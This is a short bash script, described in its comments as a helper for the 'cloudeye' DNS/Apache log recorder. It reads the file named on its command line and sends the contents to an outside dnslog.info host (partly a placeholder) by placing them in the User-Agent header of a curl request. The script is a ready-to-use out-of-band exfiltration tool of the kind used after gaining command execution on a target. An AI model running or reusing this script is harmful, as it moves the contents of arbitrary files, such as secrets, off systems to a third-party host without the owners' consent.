#!/bin/bash

# cloudeye is a dns/apache log recorder
# you can buy a code at http://www.wooyun.org/market/260
# you need edit it before you use this .sh



domain='http://xxx.xxxxxx.dnslog.info'
file=$1
curl $domain -H "User-Agent: `cat $file | xargs echo -n `"
